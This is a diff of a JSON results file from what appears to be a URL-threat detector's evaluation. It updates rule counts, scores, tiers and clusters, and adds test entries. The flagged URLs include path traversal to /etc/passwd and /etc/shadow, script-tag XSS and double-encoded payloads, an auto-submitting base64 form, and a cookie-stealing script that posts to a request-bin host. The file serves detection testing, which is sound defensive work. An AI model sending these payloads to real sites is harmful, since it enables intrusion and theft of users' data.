@@ -1,26 +1,28 @@
 {
   "rules_version": "2026-10-10",
-  "total": 231,
-  "flagged": 175,
+  "total": 249,
+  "flagged": 191,
   "tier_counts": {
-    "noise": 86,
-    "suggestive": 42,
-    "significant": 103
+    "noise": 91,
+    "suggestive": 76,
+    "significant": 82
   },
   "rule_counts": {
     "antibot.baxia": 1,
     "antibot.captcha_solver": 1,
+    "antibot.incapsula": 1,
     "antibot.ocr_captcha": 1,
     "cache.buster": 33,
     "carrier.codesandbox": 1,
     "carrier.data_url_script": 1,
-    "carrier.form_post_program": 1,
-    "carrier.html_program": 9,
-    "carrier.httpbin": 9,
-    "carrier.inline_fetch_program": 4,
+    "carrier.form_post_program": 2,
+    "carrier.html_program": 11,
+    "carrier.httpbin": 14,
+    "carrier.inline_fetch_program": 6,
     "carrier.livecodes": 1,
     "exfil.cookie": 1,
     "exfil.disposable_mail": 1,
+    "exfil.httpbin_data": 3,
     "exfil.ntfy": 2,
     "exfil.oast_service": 1,
     "exfil.paste": 1,
@@ -28,13 +30,16 @@
     "exfil.webhook_site": 8,
     "exploit.boundary_ids": 1,
     "exploit.cmdi": 2,
+    "exploit.double_encoded_meta": 2,
+    "exploit.double_encoded_path": 3,
     "exploit.sqli_boolean": 28,
     "exploit.sqli_quote": 4,
     "exploit.sqli_union": 9,
     "exploit.ssti": 4,
     "exploit.traversal": 7,
     "exploit.traversal_single": 8,
-    "exploit.xss": 10,
+    "exploit.xss": 12,
+    "header.agent_ua": 1,
     "header.gzip_only_requests": 2,
     "header.headless_ua": 5,
     "header.scripted_ua": 13,
@@ -51,6 +56,7 @@
     "marker.json_quote_residue": 2,
     "marker.md_link": 1,
     "marker.md_url_wrapper": 1,
+    "marker.oai_prefix": 1,
     "marker.oai_tag": 1,
     "marker.placeholder": 6,
     "marker.placeholder_identity": 5,
@@ -61,7 +67,7 @@
     "marker.tool_call_json": 2,
     "marker.tool_call_markup": 2,
     "marker.truncated_output": 2,
-    "marker.uq_tags": 50,
+    "marker.uq_tags": 53,
     "outcome.challenge": 1,
     "outcome.neterror": 1,
     "relay.allorigins": 1,
@@ -71,6 +77,7 @@
     "relay.markdown_new": 4,
     "relay.microlink": 5,
     "relay.translate_goog": 1,
+    "selfid.signature_agent": 1,
     "selfid.vendor_name": 1
   },
   "results": [
@@ -105,7 +112,7 @@
       ],
       "target_host": "portal.clinic.example",
       "features": [],
-      "cluster": 5
+      "cluster": 3
     },
     {
       "obs": {
@@ -138,7 +145,7 @@
       ],
       "target_host": "portal.clinic.example",
       "features": [],
-      "cluster": 5
+      "cluster": 3
     },
     {
       "obs": {
@@ -171,7 +178,7 @@
       ],
       "target_host": "portal.clinic.example",
       "features": [],
-      "cluster": 5
+      "cluster": 3
     },
     {
       "obs": {
@@ -204,7 +211,7 @@
       ],
       "target_host": "portal.clinic.example",
       "features": [],
-      "cluster": 5
+      "cluster": 3
     },
     {
       "obs": {
@@ -237,7 +244,7 @@
       ],
       "target_host": "portal.clinic.example",
       "features": [],
-      "cluster": 5
+      "cluster": 3
     },
     {
       "obs": {
@@ -270,7 +277,7 @@
       ],
       "target_host": "portal.clinic.example",
       "features": [],
-      "cluster": 5
+      "cluster": 3
     },
     {
       "obs": {
@@ -311,7 +318,7 @@
       ],
       "target_host": "shop.bakery.example",
       "features": [],
-      "cluster": 10
+      "cluster": 7
     },
     {
       "obs": {
@@ -344,7 +351,7 @@
       ],
       "target_host": "shop.bakery.example",
       "features": [],
-      "cluster": 10
+      "cluster": 7
     },
     {
       "obs": {
@@ -377,7 +384,7 @@
       ],
       "target_host": "shop.bakery.example",
       "features": [],
-      "cluster": 10
+      "cluster": 7
     },
     {
       "obs": {
@@ -410,7 +417,7 @@
       ],
       "target_host": "shop.bakery.example",
       "features": [],
-      "cluster": 10
+      "cluster": 7
     },
     {
       "obs": {
@@ -451,7 +458,7 @@
       ],
       "target_host": "login.coop.example",
       "features": [],
-      "cluster": 11
+      "cluster": 8
     },
     {
       "obs": {
@@ -492,7 +499,7 @@
       ],
       "target_host": "login.coop.example",
       "features": [],
-      "cluster": 11
+      "cluster": 8
     },
     {
       "obs": {
@@ -533,7 +540,7 @@
       ],
       "target_host": "login.coop.example",
       "features": [],
-      "cluster": 11
+      "cluster": 8
     },
     {
       "obs": {
@@ -574,7 +581,7 @@
       ],
       "target_host": "login.coop.example",
       "features": [],
-      "cluster": 11
+      "cluster": 8
     },
     {
       "obs": {
@@ -607,7 +614,7 @@
       ],
       "target_host": "api.parts.example",
       "features": [],
-      "cluster": 3
+      "cluster": 1
     },
     {
       "obs": {
@@ -640,7 +647,7 @@
       ],
       "target_host": "api.parts.example",
       "features": [],
-      "cluster": 3
+      "cluster": 1
     },
     {
       "obs": {
@@ -673,7 +680,7 @@
       ],
       "target_host": "api.parts.example",
       "features": [],
-      "cluster": 3
+      "cluster": 1
     },
     {
       "obs": {
@@ -706,7 +713,7 @@
       ],
       "target_host": "api.parts.example",
       "features": [],
-      "cluster": 3
+      "cluster": 1
     },
     {
       "obs": {
@@ -739,7 +746,7 @@
       ],
       "target_host": "api.parts.example",
       "features": [],
-      "cluster": 3
+      "cluster": 1
     },
     {
       "obs": {
@@ -772,7 +779,7 @@
       ],
       "target_host": "api.parts.example",
       "features": [],
-      "cluster": 3
+      "cluster": 1
     },
     {
       "obs": {
@@ -805,7 +812,7 @@
       ],
       "target_host": "api.parts.example",
       "features": [],
-      "cluster": 3
+      "cluster": 1
     },
     {
       "obs": {
@@ -832,7 +839,7 @@
         "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
         "status": 404
       },
-      "score": 9,
+      "score": 5,
       "tier": "significant",
       "hits": [
         {
@@ -862,7 +869,7 @@
       ],
       "target_host": "files.depot.example",
       "features": [],
-      "cluster": 2
+      "cluster": 0
     },
     {
       "obs": {
@@ -873,7 +880,7 @@
         "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
         "status": 404
       },
-      "score": 9,
+      "score": 5,
       "tier": "significant",
       "hits": [
         {
@@ -903,7 +910,7 @@
       ],
       "target_host": "files.depot.example",
       "features": [],
-      "cluster": 2
+      "cluster": 0
     },
     {
       "obs": {
@@ -936,7 +943,7 @@
       ],
       "target_host": "files.depot.example",
       "features": [],
-      "cluster": 2
+      "cluster": 0
     },
     {
       "obs": {
@@ -969,7 +976,7 @@
       ],
       "target_host": "files.depot.example",
       "features": [],
-      "cluster": 2
+      "cluster": 0
     },
     {
       "obs": {
@@ -1010,7 +1017,7 @@
       ],
       "target_host": "files.depot.example",
       "features": [],
-      "cluster": 2
+      "cluster": 0
     },
     {
       "obs": {
@@ -1043,7 +1050,7 @@
       ],
       "target_host": "files.depot.example",
       "features": [],
-      "cluster": 2
+      "cluster": 0
     },
     {
       "obs": {
@@ -1076,7 +1083,7 @@
       ],
       "target_host": "files.depot.example",
       "features": [],
-      "cluster": 2
+      "cluster": 0
     },
     {
       "obs": {
@@ -1109,7 +1116,7 @@
       ],
       "target_host": "files.depot.example",
       "features": [],
-      "cluster": 2
+      "cluster": 0
     },
     {
       "obs": {
@@ -1142,7 +1149,7 @@
       ],
       "target_host": "intranet.lab.example",
       "features": [],
-      "cluster": 8
+      "cluster": 5
     },
     {
       "obs": {
@@ -1191,7 +1198,7 @@
       ],
       "target_host": "intranet.lab.example",
       "features": [],
-      "cluster": 8
+      "cluster": 5
     },
     {
       "obs": {
@@ -1224,7 +1231,7 @@
       ],
       "target_host": "intranet.lab.example",
       "features": [],
-      "cluster": 8
+      "cluster": 5
     },
     {
       "obs": {
@@ -1265,7 +1272,7 @@
       ],
       "target_host": "intranet.lab.example",
       "features": [],
-      "cluster": 8
+      "cluster": 5
     },
     {
       "obs": {
@@ -1298,7 +1305,7 @@
       ],
       "target_host": "intranet.lab.example",
       "features": [],
-      "cluster": 8
+      "cluster": 5
     },
     {
       "obs": {
@@ -1447,7 +1454,7 @@
       "features": [
         "param:uqtag=pl4nt1"
       ],
-      "cluster": 24
+      "cluster": 20
     },
     {
       "obs": {
@@ -1502,7 +1509,7 @@
       "features": [
         "param:uqtag=pl4nt1"
       ],
-      "cluster": 24
+      "cluster": 20
     },
     {
       "obs": {
@@ -1548,7 +1555,7 @@
         "ts": 1788426000,
         "url": "https://api.plant-b.example/v2/files?path=..%2F..%2F..%2F..%2Fetc%2Fpasswd&_=1788426000123&run=pb7781"
       },
-      "score": 10,
+      "score": 6,
       "tier": "significant",
       "hits": [
         {
@@ -1588,7 +1595,7 @@
       "features": [
         "param:run=pb7781"
       ],
-      "cluster": 25
+      "cluster": 21
     },
     {
       "obs": {
@@ -1597,7 +1604,7 @@
         "ts": 1788426120,
         "url": "https://api.plant-b.example/v2/files?path=..%2F..%2F..%2F..%2Fetc%2Fshadow&_=1788426120456&run=pb7781"
       },
-      "score": 10,
+      "score": 6,
       "tier": "significant",
       "hits": [
         {
@@ -1637,7 +1644,7 @@
       "features": [
         "param:run=pb7781"
       ],
-      "cluster": 25
+      "cluster": 21
     },
     {
       "obs": {
@@ -1842,7 +1849,7 @@
       ],
       "target_host": "records.agency.example",
       "features": [],
-      "cluster": 9
+      "cluster": 6
     },
     {
       "obs": {
@@ -1883,7 +1890,7 @@
       "features": [
         "param:uqtag=r7k2"
       ],
-      "cluster": 9
+      "cluster": 6
     },
     {
       "obs": {
@@ -1931,7 +1938,7 @@
         "ts": 1782986760,
         "url": "https://data.portal.example/download?file=..%2F..%2F..%2Fetc%2Fpasswd&host=%7B%7Btarget%7D%7D"
       },
-      "score": 10,
+      "score": 6,
       "tier": "significant",
       "hits": [
         {
@@ -2014,7 +2021,7 @@
       ],
       "target_host": "records.agency.example",
       "features": [],
-      "cluster": 27
+      "cluster": 28
     },
     {
       "obs": {
@@ -2143,7 +2150,7 @@
       ],
       "target_host": "records.agency.example",
       "features": [],
-      "cluster": 27
+      "cluster": 28
     },
     {
       "obs": {
@@ -2266,7 +2273,7 @@
       ],
       "target_host": "records.agency.example",
       "features": [],
-      "cluster": 9
+      "cluster": 6
     },
     {
       "obs": {
@@ -2393,7 +2400,7 @@
       "features": [
         "param:uqtag=k3m9"
       ],
-      "cluster": 9
+      "cluster": 6
     },
     {
       "obs": {
@@ -2453,7 +2460,7 @@
       "features": [
         "param:uqtag=r7k2"
       ],
-      "cluster": 9
+      "cluster": 6
     },
     {
       "obs": {
@@ -2512,7 +2519,7 @@
         "ts": 1782987540,
         "url": "https://r.jina.ai/hxxps://records.agency.example/contracts?file=..%2F..%2F..%2Fetc%2Fpasswd"
       },
-      "score": 12,
+      "score": 8,
       "tier": "significant",
       "hits": [
         {
@@ -2642,7 +2649,7 @@
       ],
       "target_host": "data.portal.example",
       "features": [],
-      "cluster": 28
+      "cluster": 29
     },
     {
       "obs": {
@@ -2720,7 +2727,7 @@
       ],
       "target_host": "data.portal.example",
       "features": [],
-      "cluster": 28
+      "cluster": 29
     },
     {
       "obs": {
@@ -2766,7 +2773,7 @@
       ],
       "target_host": "records.agency.example",
       "features": [],
-      "cluster": 20
+      "cluster": 15
     },
     {
       "obs": {
@@ -2814,7 +2821,7 @@
       ],
       "target_host": "records.agency.example",
       "features": [],
-      "cluster": 20
+      "cluster": 15
     },
     {
       "obs": {
@@ -3571,7 +3578,7 @@
       ],
       "target_host": "civilrightsdata.ed.gov",
       "features": [],
-      "cluster": 19
+      "cluster": 14
     },
     {
       "obs": {
@@ -3602,7 +3609,7 @@
       ],
       "target_host": "civilrightsdata.ed.gov",
       "features": [],
-      "cluster": 19
+      "cluster": 14
     },
     {
       "obs": {
@@ -3647,7 +3654,7 @@
       ],
       "target_host": "recherche-collection-search.bac-lac.canada.ca",
       "features": [],
-      "cluster": 14
+      "cluster": 9
     },
     {
       "obs": {
@@ -3678,7 +3685,7 @@
       ],
       "target_host": "recherche-collection-search.bac-lac.canada.ca",
       "features": [],
-      "cluster": 14
+      "cluster": 9
     },
     {
       "obs": {
@@ -3709,7 +3716,7 @@
       ],
       "target_host": "recherche-collection-search.bac-lac.canada.ca",
       "features": [],
-      "cluster": 14
+      "cluster": 9
     },
     {
       "obs": {
@@ -3718,9 +3725,26 @@
         "ts": 1782922800,
         "url": "https://cal-access.sos.ca.gov/_Incapsula_Resource?SWUDNSAI=31"
       },
-      "score": 0,
-      "tier": "noise",
-      "hits": [],
+      "score": 3,
+      "tier": "suggestive",
+      "hits": [
+        {
+          "rule_id": "antibot.incapsula",
+          "kind": "anti_bot",
+          "weight": 3,
+          "matched": "_Incapsula_Resource",
+          "layer": 0,
+          "tactic": "T3"
+        }
+      ],
+      "layers": [
+        {
+          "via": "submitted",
+          "depth": 0,
+          "host": "cal-access.sos.ca.gov",
+          "text": "https://cal-access.sos.ca.gov/_Incapsula_Resource?SWUDNSAI=31"
+        }
+      ],
       "target_host": "cal-access.sos.ca.gov",
       "features": [],
       "cluster": null
@@ -3777,8 +3801,8 @@
         "ts": 1784122800,
         "url": "https://markdown.new/https://portal.max.gov/portal/document/SF133/Budget/FY%202023%20-%20SF%20133%20Reports.html?uniq3"
       },
-      "score": 3,
-      "tier": "suggestive",
+      "score": 2,
+      "tier": "noise",
       "hits": [
         {
           "rule_id": "relay.markdown_new",
@@ -3884,7 +3908,7 @@
         "marker.test_tag:tok=expt",
         "param:tok=expt3"
       ],
-      "cluster": 26
+      "cluster": 27
     },
     {
       "obs": {
@@ -3932,7 +3956,7 @@
         "marker.test_tag:tok=expt",
         "param:tok=expt4"
       ],
-      "cluster": 26
+      "cluster": 27
     },
     {
       "obs": {
@@ -4018,7 +4042,7 @@
       ],
       "target_host": "vizprod.aihw.gov.au",
       "features": [],
-      "cluster": 23
+      "cluster": 19
     },
     {
       "obs": {
@@ -4027,8 +4051,8 @@
         "ts": 1786500840,
         "url": "https://eu.httpbin.org/base64/PHNjcmlwdD5mZXRjaCgnaHR0cHM6Ly92aXpwcm9kLmFpaHcuZ292LmF1L3ZpZXdzL0Rhc2hib2FyZC9PdmVydmlldz86ZW1iZWQ9eScpLnRoZW4ocj0+ci50ZXh0KCkpLnRoZW4odD0+ZG9jdW1lbnQudGl0bGU9dC5sZW5ndGgpPC9zY3JpcHQ+"
       },
-      "score": 9,
-      "tier": "significant",
+      "score": 5,
+      "tier": "suggestive",
       "hits": [
         {
           "rule_id": "carrier.inline_fetch_program",
@@ -4084,7 +4108,7 @@
       ],
       "target_host": "vizprod.aihw.gov.au",
       "features": [],
-      "cluster": 23
+      "cluster": 19
     },
     {
       "obs": {
@@ -4152,7 +4176,7 @@
       ],
       "target_host": "api.datausa.io",
       "features": [],
-      "cluster": 22
+      "cluster": 17
     },
     {
       "obs": {
@@ -4161,7 +4185,7 @@
         "ts": 1785771120,
         "url": "https://api.datausa.io/tesseract/data.jsonrecords?cube=../../etc/passwd"
       },
-      "score": 9,
+      "score": 5,
       "tier": "significant",
       "hits": [
         {
@@ -4191,7 +4215,7 @@
       ],
       "target_host": "api.datausa.io",
       "features": [],
-      "cluster": 22
+      "cluster": 17
     },
     {
       "obs": {
@@ -4200,8 +4224,8 @@
         "ts": 1787209200,
         "url": "data:text/html,<script>fetch('https://api.datausa.io/tesseract/data.jsonrecords?cube=ipeds_completions').then(r=>r.text()).then(t=>document.title=t.slice(0,80))</script>"
       },
-      "score": 10,
-      "tier": "significant",
+      "score": 3,
+      "tier": "suggestive",
       "hits": [
         {
           "rule_id": "carrier.data_url_script",
@@ -4938,8 +4962,8 @@
         "ts": 1778745600,
         "url": "https://httpbin.org/base64/PHByZSBpZD1vPndhaXQ8L3ByZT48c2NyaXB0Pihhc3luYygpPT57bz1kb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnbycpO28udGV4dENvbnRlbnQ9YXdhaXQoYXdhaXQgZmV0Y2goJy8vci5qaW5hLmFpL2h0dHBzOi8vd3d3LnRocmlsbC1kYXRhLmNvbS93YWl0cy8nKSkudGV4dCgpfSkoKTwvc2NyaXB0Pg"
       },
-      "score": 7,
-      "tier": "significant",
+      "score": 5,
+      "tier": "suggestive",
       "hits": [
         {
           "rule_id": "carrier.inline_fetch_program",
@@ -4991,6 +5015,366 @@
     },
     {
       "obs": {
+        "id": "eval:unctad-xssgame",
+        "source": "eval",
+        "ts": 1779699600,
+        "url": "https://xss-game.appspot.com/level1/frame?query=%3Cscript%3Efetch('https://unctadstat-api.unctad.org/datamart-api/US.PCI/2005/Facts')%3C/script%3E"
+      },
+      "score": 7,
+      "tier": "significant",
+      "hits": [
+        {
+          "rule_id": "carrier.inline_fetch_program",
+          "kind": "carrier",
+          "weight": 3,
+          "matched": "fetch('https://",
+          "layer": 0,
+          "tactic": "T2"
+        },
+        {
+          "rule_id": "carrier.html_program",
+          "kind": "carrier",
+          "weight": 2,
+          "matched": "<script",
+          "layer": 0,
+          "tactic": "T2"
+        },
+        {
+          "rule_id": "exploit.xss",
+          "kind": "exploit",
+          "weight": 4,
+          "matched": "query=<script",
+          "layer": 0,
+          "tactic": "T4"
+        }
+      ],
+      "layers": [
+        {
+          "via": "submitted",
+          "depth": 0,
+          "host": "xss-game.appspot.com",
+          "text": "https://xss-game.appspot.com/level1/frame?query=<script>fetch('https://unctadstat-api.unctad.org/datamart-api/US.PCI/2005/Facts')</script>"
+        }
+      ],
+      "target_host": "xss-game.appspot.com",
+      "features": [],
+      "cluster": null
+    },
+    {
+      "obs": {
+        "id": "eval:unctad-httpbin-exfil",
+        "source": "eval",
+        "ts": 1777287600,
+        "url": "https://httpbin.org/get?d=%7B%22US.PCI.2005.Facts%22%3A%5B%7B%22Year%22%3A2005%2C%22M6080%22%3A123456%2C%22Economy%22%3A%22US%22%7D%5D%7D"
+      },
+      "score": 5,
+      "tier": "significant",
+      "hits": [
+        {
+          "rule_id": "carrier.httpbin",
+          "kind": "carrier",
+          "weight": 2,
+          "matched": "httpbin.org",
+          "layer": 0,
+          "tactic": "T2"
+        },
+        {
+          "rule_id": "exfil.httpbin_data",
+          "kind": "exfil",
+          "weight": 3,
+          "matched": "httpbin.org/get?d={\"US.PCI.2005.Facts\":[{\"Year\":2005,\"M6080\":123456,\"Economy\":\"US\"}]}",
+          "layer": 0,
+          "tactic": "T7"
+        }
+      ],
+      "layers": [
+        {
+          "via": "submitted",
+          "depth": 0,
+          "host": "httpbin.org",
+          "text": "https://httpbin.org/get?d={\"US.PCI.2005.Facts\":[{\"Year\":2005,\"M6080\":123456,\"Economy\":\"US\"}]}"
+        }
+      ],
+      "target_host": null,
+      "features": [],
+      "cluster": null
+    },
+    {
+      "obs": {
+        "id": "eval:unctad-doubleenc",
+        "source": "eval",
+        "ts": 1777881600,
+        "url": "https://unctadstat-api.unctad.org/datamart-api/US.PCI/2005/F%2561cts?$select=Year,M6080&$top=1&culture=en"
+      },
+      "score": 4,
+      "tier": "significant",
+      "hits": [
+        {
+          "rule_id": "exploit.double_encoded_path",
+          "kind": "exploit",
+          "weight": 4,
+          "matched": "/F%61",
+          "layer": 0,
+          "tactic": "T4"
+        }
+      ],
+      "layers": [
+        {
+          "via": "submitted",
+          "depth": 0,
+          "host": "unctadstat-api.unctad.org",
+          "text": "https://unctadstat-api.unctad.org/datamart-api/US.PCI/2005/F%61cts?$select=Year,M6080&$top=1&culture=en"
+        }
+      ],
+      "target_host": "unctadstat-api.unctad.org",
+      "features": [],
+      "cluster": null
+    },
+    {
+      "obs": {
+        "id": "eval:unctad-formpost",
+        "source": "eval",
+        "ts": 1778736240,
+        "url": "https://httpbin.org/base64/PCFkb2N0eXBlIGh0bWw-PGh0bWw-PGJvZHkgb25sb2FkPSJkb2N1bWVudC5mb3Jtc1swXS5zdWJtaXQoKSI-PGZvcm0gbWV0aG9kPSJQT1NUIiBhY3Rpb249Imh0dHBzOi8vdW5jdGFkc3RhdC1hcGkudW5jdGFkLm9yZy9kYXRhbWFydC1hcGkvVVMuUENJLzIwMDUvRmFjdHMiPjxpbnB1dCBuYW1lPSIkc2VsZWN0IiB2YWx1ZT0iWWVhciwgTTYwODAiPjwvZm9ybT4-"
+      },
+      "score": 5,
+      "tier": "suggestive",
+      "hits": [
+        {
+          "rule_id": "carrier.form_post_program",
+          "kind": "carrier",
+          "weight": 3,
+          "matched": "forms[0].submit(",
+          "layer": 0,
+          "tactic": "T2"
+        },
+        {
+          "rule_id": "carrier.httpbin",
+          "kind": "carrier",
+          "weight": 2,
+          "matched": "httpbin.org",
+          "layer": 1,
+          "tactic": "T2"
+        }
+      ],
+      "layers": [
+        {
+          "via": "base64:path",
+          "depth": 1,
+          "text": "<!doctype html><html><body onload=\"document.forms[0].submit()\"><form method=\"POST\" action=\"https://unctadstat-api.unctad.org/datamart-api/US.PCI/2005/Facts\"><input name=\"$select\" value=\"Year, M6080\"></form>>"
+        },
+        {
+          "via": "submitted",
+          "depth": 0,
+          "host": "httpbin.org",
+          "text": "https://httpbin.org/base64/PCFkb2N0eXBlIGh0bWw-PGh0bWw-PGJvZHkgb25sb2FkPSJkb2N1bWVudC5mb3Jtc1swXS5zdWJtaXQoKSI-PGZvcm0gbWV0aG9kPSJQT1NUIiBhY3Rpb249Imh0dHBzOi8vdW5jdGFkc3RhdC1hcGkudW5jdGFkLm9yZy9kYXRhbWFydC1hcGkvVVMuUENJLzIwMDUvRmFjdHMiPjxpbnB1dCBuYW1lPSIkc2VsZWN0IiB2YWx1ZT0iWWVhciwgTTYwODAiPjwvZm9ybT4-"
+        },
+        {
+          "via": "embedded",
+          "depth": 1,
+          "host": "unctadstat-api.unctad.org",
+          "text": "https://unctadstat-api.unctad.org/datamart-api/US.PCI/2005/Facts"
+        }
+      ],
+      "target_host": "unctadstat-api.unctad.org",
+      "features": [],
+      "cluster": null
+    },
+    {
+      "obs": {
+        "id": "eval:b-httpbin-longparam",
+        "source": "eval",
+        "ts": 1781949600,
+        "url": "https://httpbin.org/anything?json=%7B%22items%22%3A%5B1%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%5D%7D"
+      },
+      "score": 2,
+      "tier": "noise",
+      "hits": [
+        {
+          "rule_id": "carrier.httpbin",
+          "kind": "carrier",
+          "weight": 2,
+          "matched": "httpbin.org",
+          "layer": 0,
+          "tactic": "T2"
+        }
+      ],
+      "layers": [
+        {
+          "via": "submitted",
+          "depth": 0,
+          "host": "httpbin.org",
+          "text": "https://httpbin.org/anything?json={\"items\":[1,2,3,4,5,6,7,8,9,10,11,12]}"
+        }
+      ],
+      "target_host": null,
+      "features": [],
+      "cluster": null
+    },
+    {
+      "obs": {
+        "id": "eval:b-encoded-space-path",
+        "source": "eval",
+        "ts": 1781949900,
+        "url": "https://docs.example.com/reports/annual%2520report%2520final.pdf"
+      },
+      "score": 0,
+      "tier": "noise",
+      "hits": [],
+      "target_host": "docs.example.com",
+      "features": [],
+      "cluster": null
+    },
+    {
+      "obs": {
+        "id": "eval:unctad-firing-range-xss",
+        "source": "eval",
+        "ts": 1779786000,
+        "url": "https://public-firing-range.appspot.com/reflected/parameter/body?q=%3Cscript%3Efetch('https://unctadstat-api.unctad.org/datamart-api/US.PCI/2005/Facts')%3C/script%3E"
+      },
+      "score": 7,
+      "tier": "significant",
+      "hits": [
+        {
+          "rule_id": "carrier.inline_fetch_program",
+          "kind": "carrier",
+          "weight": 3,
+          "matched": "fetch('https://",
+          "layer": 0,
+          "tactic": "T2"
+        },
+        {
+          "rule_id": "carrier.html_program",
+          "kind": "carrier",
+          "weight": 2,
+          "matched": "<script",
+          "layer": 0,
+          "tactic": "T2"
+        },
+        {
+          "rule_id": "exploit.xss",
+          "kind": "exploit",
+          "weight": 4,
+          "matched": "q=<script",
+          "layer": 0,
+          "tactic": "T4"
+        }
+      ],
+      "layers": [
+        {
+          "via": "submitted",
+          "depth": 0,
+          "host": "public-firing-range.appspot.com",
+          "text": "https://public-firing-range.appspot.com/reflected/parameter/body?q=<script>fetch('https://unctadstat-api.unctad.org/datamart-api/US.PCI/2005/Facts')</script>"
+        }
+      ],
+      "target_host": "public-firing-range.appspot.com",
+      "features": [],
+      "cluster": null
+    },
+    {
+      "obs": {
+        "id": "eval:unctad-httpbin-error",
+        "source": "eval",
+        "ts": 1777287720,
+        "url": "https://httpbin.org/get?e=HTTP%20400%20Bad%20Request%3A%20a%20GET%20to%20%2Fdatamart-api%2FUS.PCI%2F2005%2FFacts%20is%20not%20allowed"
+      },
+      "score": 5,
+      "tier": "significant",
+      "hits": [
+        {
+          "rule_id": "carrier.httpbin",
+          "kind": "carrier",
+          "weight": 2,
+          "matched": "httpbin.org",
+          "layer": 0,
+          "tactic": "T2"
+        },
+        {
+          "rule_id": "exfil.httpbin_data",
+          "kind": "exfil",
+          "weight": 3,
+          "matched": "httpbin.org/get?e=HTTP 400 Bad Request: a GET to /datamart-api/US.PCI/2005/Facts is not allowed",
+          "layer": 0,
+          "tactic": "T7"
+        }
+      ],
+      "layers": [
+        {
+          "via": "submitted",
+          "depth": 0,
+          "host": "httpbin.org",
+          "text": "https://httpbin.org/get?e=HTTP 400 Bad Request: a GET to /datamart-api/US.PCI/2005/Facts is not allowed"
+        }
+      ],
+      "target_host": null,
+      "features": [],
+      "cluster": null
+    },
+    {
+      "obs": {
+        "id": "eval:lac-xss-doubleenc",
+        "source": "eval",
+        "ts": 1781082870,
+        "url": "https://recherche-collection-search.bac-lac.canada.ca/eng/Home/Record?app=divincan&IdNumber=%253Cscript%253Ealert(document.domain)%253C%252Fscript%253E"
+      },
+      "score": 4,
+      "tier": "significant",
+      "hits": [
+        {
+          "rule_id": "exploit.double_encoded_meta",
+          "kind": "exploit",
+          "weight": 4,
+          "matched": "IdNumber=%3C",
+          "layer": 0,
+          "tactic": "T4"
+        }
+      ],
+      "layers": [
+        {
+          "via": "submitted",
+          "depth": 0,
+          "host": "recherche-collection-search.bac-lac.canada.ca",
+          "text": "https://recherche-collection-search.bac-lac.canada.ca/eng/Home/Record?app=divincan&IdNumber=%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E"
+        }
+      ],
+      "target_host": "recherche-collection-search.bac-lac.canada.ca",
+      "features": [],
+      "cluster": 9
+    },
+    {
+      "obs": {
+        "id": "eval:unctad-doubleenc-slash",
+        "source": "eval",
+        "ts": 1777968000,
+        "url": "https://unctadstat-api.unctad.org/datamart-api%252fUS.PCI/2005/Facts?$select=Year"
+      },
+      "score": 4,
+      "tier": "significant",
+      "hits": [
+        {
+          "rule_id": "exploit.double_encoded_path",
+          "kind": "exploit",
+          "weight": 4,
+          "matched": "/datamart-api%2f",
+          "layer": 0,
+          "tactic": "T4"
+        }
+      ],
+      "layers": [
+        {
+          "via": "submitted",
+          "depth": 0,
+          "host": "unctadstat-api.unctad.org",
+          "text": "https://unctadstat-api.unctad.org/datamart-api%2fUS.PCI/2005/Facts?$select=Year"
+        }
+      ],
+      "target_host": "unctadstat-api.unctad.org",
+      "features": [],
+      "cluster": null
+    },
+    {
+      "obs": {
         "id": "eval:cov-corsproxy-sqli",
         "source": "eval",
         "ts": 1785747600,
@@ -5032,7 +5416,7 @@
       ],
       "target_host": "records.agency.example",
       "features": [],
-      "cluster": 15
+      "cluster": 11
     },
     {
       "obs": {
@@ -5100,7 +5484,7 @@
       ],
       "target_host": "records.agency.example",
       "features": [],
-      "cluster": 15
+      "cluster": 11
     },
     {
       "obs": {
@@ -5131,7 +5515,7 @@
       ],
       "target_host": "records.agency.example",
       "features": [],
-      "cluster": 15
+      "cluster": 11
     },
     {
       "obs": {
@@ -5190,7 +5574,7 @@
       ],
       "target_host": "records.agency.example",
       "features": [],
-      "cluster": 21
+      "cluster": 16
     },
     {
       "obs": {
@@ -5221,7 +5605,7 @@
       ],
       "target_host": "records.agency.example",
       "features": [],
-      "cluster": 21
+      "cluster": 16
     },
     {
       "obs": {
@@ -5304,7 +5688,7 @@
       "features": [
         "param:uqtag=covrun7"
       ],
-      "cluster": 16
+      "cluster": 12
     },
     {
       "obs": {
@@ -5313,8 +5697,8 @@
         "ts": 1785924060,
         "url": "https://r.jina.ai/https://portal.agency.example/search?q=permits&agent=claude&uqtag=covrun7"
       },
-      "score": 6,
-      "tier": "significant",
+      "score": 5,
+      "tier": "suggestive",
       "hits": [
         {
           "rule_id": "relay.jina",
@@ -5359,7 +5743,7 @@
       "features": [
         "param:uqtag=covrun7"
       ],
-      "cluster": 16
+      "cluster": 12
     },
     {
       "obs": {
@@ -5412,7 +5796,7 @@
       "features": [
         "exfil.webhook_site:webhook.site/deadbeef-0000-4000-8000-00000000c0de"
       ],
-      "cluster": 29
+      "cluster": 30
     },
     {
       "obs": {
@@ -5451,7 +5835,7 @@
       "features": [
         "exfil.webhook_site:webhook.site/deadbeef-0000-4000-8000-00000000c0de"
       ],
-      "cluster": 29
+      "cluster": 30
     },
     {
       "obs": {
@@ -5518,7 +5902,7 @@
       "features": [
         "exfil.requestbin:c0ve7x9.m.pipedream.net"
       ],
-      "cluster": 17
+      "cluster": 13
     },
     {
       "obs": {
@@ -5557,7 +5941,7 @@
       "features": [
         "exfil.requestbin:c0ve7x9.m.pipedream.net"
       ],
-      "cluster": 17
+      "cluster": 13
     },
     {
       "obs": {
@@ -5661,7 +6045,7 @@
       "features": [
         "exfil.ntfy:/ntfy.sh/covrun7results"
       ],
-      "cluster": 30
+      "cluster": 31
     },
     {
       "obs": {
@@ -5700,7 +6084,7 @@
       "features": [
         "exfil.ntfy:/ntfy.sh/covrun7results"
       ],
-      "cluster": 30
+      "cluster": 31
     },
     {
       "obs": {
@@ -5760,7 +6144,7 @@
         "ts": 1786104000,
         "url": "https://records.agency.example/search?q=%3Cscript%3Efetch(%27//c0ve7x9.m.pipedream.net/?c=%27%2Bdocument.cookie)%3C/script%3E"
       },
